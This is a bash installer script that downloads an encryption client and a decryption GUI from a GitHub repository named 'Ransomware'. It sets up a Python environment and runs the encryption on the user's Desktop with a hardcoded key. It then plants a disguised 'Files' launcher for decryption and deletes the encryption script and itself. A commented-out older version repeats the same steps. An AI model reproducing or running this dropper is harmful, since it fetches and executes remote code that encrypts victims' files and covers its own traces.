#!/bin/bash
set -euo pipefail

# ---------- CONFIG ----------
DESKTOP="$HOME/Desktop"
REPO_BASE="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch"
ENCRYPT_PY="client-encrypt.py"
DECRYPT_PY="client-decrypt-gui.py"
REQS_URL="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/requirements.txt"
REQS="requirements.txt"
VENV_DIR="venv"
DECRYPT_DESKTOP="${DESKTOP}/decrypt.desktop"
SHARED_KEY_VALUE="superlongrandomsecret123"   # <--- one-time shared key

# ---------- START ----------
echo "[*] Running setup on: $DESKTOP"
cd "$DESKTOP" || { echo "Failed to cd $DESKTOP"; exit 1; }

# Download Python files
echo "[*] Downloading client files..."
wget --show-progress --timeout=15 --tries=2 "${REPO_BASE}/${ENCRYPT_PY}" -O "${DESKTOP}/${ENCRYPT_PY}"
wget --show-progress --timeout=15 --tries=2 "${REPO_BASE}/${DECRYPT_PY}" -O "${DESKTOP}/${DECRYPT_PY}"
wget --show-progress --timeout=15 --tries=2 "${REQS_URL}" -O "${DESKTOP}/${REQS}"

# Create virtual environment if not exists
if [ ! -d "${DESKTOP}/${VENV_DIR}" ]; then
  echo "[*] Creating virtualenv..."
  python3 -m venv "${DESKTOP}/${VENV_DIR}"
fi

# Activate and install dependencies
echo "[*] Installing Python dependencies..."
# shellcheck disable=SC1090
source "${DESKTOP}/${VENV_DIR}/bin/activate"
pip install --upgrade pip
if [ -f "${DESKTOP}/${REQS}" ]; then
  pip install -r "${DESKTOP}/${REQS}" --prefer-binary
fi
deactivate

# Create the .desktop launcher for decryption
echo "[*] Creating decrypt.desktop launcher..."
cat > "${DECRYPT_DESKTOP}" <<'DESKTOP'
[Desktop Entry]
Name=Files
Exec=/bin/bash -c "cd ~/Desktop && source venv/bin/activate && python3 client-decrypt-gui.py && deactivate"
Type=Application
Terminal=false
Icon=system-lock-screen
DESKTOP
chmod +x "${DECRYPT_DESKTOP}"

# --- Run encryption once with the hardcoded shared key (ephemeral) ---
echo "[*] Running encryption (shared key exported for this run only)..."
export EDGE_SHARED_KEY="${SHARED_KEY_VALUE}"

# shellcheck disable=SC1090
source "${DESKTOP}/${VENV_DIR}/bin/activate"
python3 "${DESKTOP}/${ENCRYPT_PY}"
deactivate

# Unset the environment variable immediately
unset EDGE_SHARED_KEY
echo "[*] EDGE_SHARED_KEY unset."

# ---------- CLEANUP ----------
echo "[*] Performing cleanup..."
rm -f "${DESKTOP}/${REQS}" || true
rm -f "${DESKTOP}/${ENCRYPT_PY}" || true   # remove encrypt script after one-time use

SELF="$(realpath "$0")"
if [[ "${SELF}" == "${DESKTOP}/setup.sh" ]]; then
  echo "  - removing installer script ${SELF}"
  rm -f "${SELF}" || true
else
  echo "  - installer script not removed (not running from ${DESKTOP})"
fi

echo "[*] Setup finished."
echo "[*] To decrypt: double-click the 'Files' icon on Desktop or run:"
echo "    source venv/bin/activate ; python3 client-decrypt-gui.py ; deactivate"

exit 0



# #!/bin/bash
# set -euo pipefail

# cd ~/Desktop || exit 1

# # Download Python files
# wget -q https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch/client-encrypt.py
# wget -q https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch/client-decrypt-gui.py
# wget -q https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/requirements.txt

# # Create virtual environment if not exists
# if [ ! -d venv ]; then
#   python3 -m venv venv
# fi

# # Install dependencies
# source venv/bin/activate
# pip install --upgrade pip
# pip install -r requirements.txt --prefer-binary
# deactivate

# # Create the desktop launcher for decryption
# cat > decrypt.desktop <<'DESKTOP'
# [Desktop Entry]
# Name=Files
# Exec=/bin/bash -c "cd ~/Desktop && source venv/bin/activate && python3 client-decrypt-gui.py && deactivate"
# Type=Application
# Terminal=false
# Icon=system-lock-screen
# DESKTOP

# chmod +x decrypt.desktop

# # --- Run encryption once with a hardcoded shared key ---
# export EDGE_SHARED_KEY="superlongrandomsecret123"

# source venv/bin/activate
# python3 client-encrypt.py
# deactivate

# unset EDGE_SHARED_KEY
# echo "✅ Encryption done. Shared key unset."
